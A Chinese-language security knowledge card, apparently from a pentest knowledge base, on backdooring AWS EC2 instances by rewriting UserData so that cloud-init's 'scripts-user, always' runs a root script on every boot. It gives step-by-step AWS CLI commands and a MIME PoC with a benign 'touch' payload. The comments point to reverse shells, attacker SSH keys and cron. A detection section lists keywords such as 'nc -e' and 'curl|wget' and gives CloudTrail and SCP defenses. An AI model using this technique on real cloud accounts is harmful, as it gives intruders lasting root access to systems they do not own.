---
id: cloud-ec2-userdata-cloud-init-always-persistence
title: EC2 UserData 持久化：写入 cloud-init 的 scripts-user, always 让脚本每次重启都以 root 执行（后门反弹/公钥/任意命令）
type: scenario
domain: cloud
path: cloud
technique: ec2-userdata-cloud-init-always-persistence
aliases:
- EC2 UserData 后门
- cloud-init scripts-user always
- user-data 每次重启执行
- describe-instance-attribute userData 解码
- 停止实例改 UserData
- EC2 实例级持久化
tags:
- cloud
- aws
- ec2
- userdata
- cloud-init
- persistence
- backdoor
- root
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:50:44+08:00'
  notes: '已对照原文核对 cloud_final_modules: - [scripts-user, always] 声明、multipart/mixed 两段格式、控制台编辑需先停机、stop-instances 返回结构、describe-instance-attribute --attribute userData --query UserData.Value 的 base64 形态与解码内容、touch /tmp/success 验证均一致；未验证点：IncorrectInstanceState 报错文本、/var/lib/cloud/instances 副本不可删除的表述取自引用文档、AMI 继承与 Windows EC2Launch 差异为作者补充推理。引用链接已删除，避免卡片带来源 URL。'
---

## 一句话结论

EC2 的 UserData 默认只在实例**首次启动**执行一次，但把 UserData 改成 cloud-init 的 MIME 多段格式、并在里面声明 `#cloud-config` 的 `cloud_final_modules: - [scripts-user, always]`，脚本就会在**每次重启**时以 root 执行；因此用高权限 AWS 凭据 `stop-instances` → 改写 UserData（控制台或 `modify-instance-attribute --attribute userData`）→ 重启，即可把反向 shell、SSH 公钥、定时任务等任意 root 命令固化在实例配置层，且磁盘上不需要留下额外文件（脚本本体由 cloud-init 在启动时重新执行）。

## 原理

- UserData 是实例的**云配置层**，由 cloud-init 在引导阶段读取执行；默认只跑一次（首次 boot），这是官方文档明确写的「默认情况下，用户数据脚本和 cloud-init 指令仅在首次启动实例时在引导周期内运行」。
- 要「每次重启都跑」，必须显式打开对应的 cloud-init 模块：`#cloud-config` 里的 `cloud_final_modules: - [scripts-user, always]` 把 `scripts-user` 模块的频率从默认的 `once-per-instance` 改成 `always`，于是每次 boot 都会重新执行 UserData 里的 `text/x-shellscript` 段。
- MIME 多段格式允许同时给 cloud-config 与 shell 脚本：`Content-Type: multipart/mixed; boundary="//"` 里第一段是 `text/cloud-config`（含 `cloud_final_modules`），第二段是 `text/x-shellscript`（实际命令，通常以 `#!/bin/bash` 开头）。两段缺一不可——只有 shell 段而没有 `always` 声明，就只在首次执行。
- 云上查看是 base64：`aws ec2 describe-instance-attribute --attribute userData --query "UserData.Value"` 返回的是 base64 字符串，解码后才是上面那份 MIME 文本。这一步是「确认后门是否还在」的直接判据，也是防守方审计 UserData 时必须做的动作。
- 为什么需要先停机：修改 UserData 只允许在**stopped** 状态的实例上做（控制台的「编辑用户数据」页面明确提示要停止实例；CLI 强改会报 `IncorrectInstanceState`）。所以流程是 `stop-instances` → 改 → `start-instances`，改完的脚本在下一次 boot 生效。
- 为什么这是「配置层持久化」而非「文件层持久化」：脚本本体不作为普通文件存在实例磁盘的可疑目录，`/var/lib/cloud/instances/<instance-id>/` 下的副本在运行后**无法删除**（文档明确写「脚本在运行后无法删除」），所以从取证角度它既是持久化又是难清除的痕迹；而防守方即使删了 `/tmp` 里的落地文件，下次重启脚本仍会重新创建。
- 生效范围：UserData 既影响「当前实例」，也影响**由该 AMI/该实例创建出来的新实例**（若攻击者把带后门的实例做成 AMI 或用同一 UserData 批量启动），因此它也是 AWS 账号持久化的常用手法之一。
- 依赖 cloud-init：Amazon Linux/Ubuntu 等常见 AMI 都带 cloud-init；精简镜像或无 cloud-init 的 Windows 实例不适用（Windows 用 EC2Launch/EC2Launch v2 的 user data 机制，行为不同）。

## 触发条件

- 攻击者持有可 `ec2:StopInstances`、`ec2:StartInstances`、`ec2:ModifyInstanceAttribute`（或控制台同等权限）的 AWS 凭据。
- 实例使用带 cloud-init 的 Linux AMI（Amazon Linux / Ubuntu 等），且 cloud-init 的 `scripts-user` 模块未被策略禁用。
- 实例允许停机重启（生产关键实例停机可能触发告警，但技术上不受阻）。
- 后门需要在实例内以 root 执行（UserData 脚本以 root 身份运行，不需要 sudo）。

## 利用步骤

1. 侦察：`aws ec2 describe-instances --instance-ids <id>` 取 `InstanceId`，并检查 `describe-instance-attribute --attribute userData` 是否已有内容（有则先备份）。
2. 停机：`aws ec2 stop-instances --instance-ids <id>`，`describe-instances` 等到 `State.Name == "stopped"`。
3. 构造 MIME 负载：第一段 `text/cloud-config` 写 `#cloud-config` + `cloud_final_modules: - [scripts-user, always]`；第二段 `text/x-shellscript` 写 `#!/bin/bash` 加后门命令（反弹 shell、`authorized_keys` 追加、cron、创建隐藏账号等）。
4. base64 编码后写入：`aws ec2 modify-instance-attribute --instance-id <id> --attribute userData --value file://userdata.b64`（`--value` 需要 base64 文本；控制台则直接在「编辑用户数据」框粘贴 MIME 原文）。
5. 启动：`aws ec2 start-instances --instance-ids <id>`；等待 running 后登录/验证（`ls /tmp/success`、检查监听端口或公钥是否生效）。
6. 复核：再次 `describe-instance-attribute --attribute userData --query "UserData.Value"` 并 base64 解码，确认 `scripts-user, always` 与脚本段都在。
7. 收尾（可选）：还原备份的 UserData 或清空（`--value ""`），但注意「运行后无法删除」的云端副本与实例内 `/var/lib/cloud/instances/` 副本需另行清除。

## PoC

```bash
# 1) 停机（修改 UserData 要求实例处于 stopped）
aws ec2 stop-instances --instance-ids i-0183d702137794a80
# => {"StoppingInstances":[{"CurrentState":{"Code":64,"Name":"stopping"},"PreviousState":{"Code":16,"Name":"running"}, ...}]}

# 2) 查看现有 UserData（base64）
aws ec2 describe-instance-attribute --instance-id i-0183d702137794a80 \
  --attribute userData --query "UserData.Value"

# 3) 准备 MIME 负载（cloud-config 段声明 always + shellscript 段放命令）
cat > userdata.txt <<'EOF'
Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
touch /tmp/success
# 或：追加 SSH 公钥 / 反弹 shell / 写 cron
--//--
EOF

# 4) base64 后写入
base64 -w0 userdata.txt > userdata.b64
aws ec2 modify-instance-attribute --instance-id i-0183d702137794a80 \
  --attribute userData --value file://userdata.b64

# 5) 启动并验证
aws ec2 start-instances --instance-ids i-0183d702137794a80
# 登录后：ls /tmp/success 存在即说明脚本已按 UserData 执行
```

## 变体与关联

- 变体：只有在「每次重启」这个需求上才必须写 `scripts-user, always`；若只需一次性后门，普通 `#!/bin/bash` 段即可（首次 boot 执行）。
- 变体：把后门命令换成「向 `~/.ssh/authorized_keys` 追加攻击者公钥」，得到稳定的 SSH 入口，且不依赖安全组开额外端口。
- 变体：把 UserData 与「带后门的实例做成 AMI」结合：新实例会继承同一 UserData/镜像，等于批量复制后门。
- 变体：Windows 实例改走 EC2Launch/EC2Launch v2 的 user data 机制（与 Linux 的 cloud-init 不同，需按镜像文档改写）。
- 关联：[[cloud-ec2-security-group-full-open-instance-replace]]（先开网络入口，本条固化 root 执行）、[[cloud-cloud-iam-aws-backdoor-user-key-persistence]]（拿到可操作 EC2 的持久管理员身份）、[[pentest-initial-access-exposed-rdp-nat-guest]] 一类「暴露入口」卡（反向视角：本条开的是配置层入口）、[[cloud-metadata-ssrf-imdsv2-token-credential]]（实例侧凭据获取，可与本条组合成「实例内取角色凭证再回打云控制面」）。
- 边界：无 cloud-init 的镜像/Windows 不适用；实例被禁止停机或处于 ASG 托管（被替换重建）时会丢失或失效；`modify-instance-attribute` 对运行中实例报错；`scripts-user, always` 若被镜像内 cloud-init 配置覆盖则不生效。

## 检测与防御

- 检测：CloudTrail 关联 `StopInstances` + `ModifyInstanceAttribute`（`attribute=userData`）+ `StartInstances` 的短时序组合，尤其非基线身份的实例停机与 UserData 变更。
- 检测：定期审计所有实例的 UserData（base64 解码后），关键词检索 `cloud_final_modules`、`scripts-user, always`、`#!/bin/bash`、`curl|wget`、`nc -e`、`authorized_keys`、`crontab`；对 UserData 内容做基线哈希比对。
- 检测：实例内取证 `/var/lib/cloud/instances/<instance-id>/`（文档说明该副本运行后无法删除）与 `/var/log/cloud-init-output.log`（用户脚本输出会写到这里）。
- 防御：用 SCP/权限边界禁止普通身份 `ec2:ModifyInstanceAttribute`；对 UserData 变更走审批；启用 AWS Config 规则对 UserData 漂移告警；限制实例停机操作。
- 防御：镜像层面禁用不必要的 cloud-init 模块（把 `scripts-user` 的默认频率改为 once-per-instance 并禁止覆盖），或对 UserData 签名校验。
- 应急：还原 UserData 为基线并重建实例（重建比就地清理更可靠，因为 `/var/lib/cloud/` 副本与可能已落地的后门文件都需同时清）；审计该实例 IAM 角色是否被滥用。
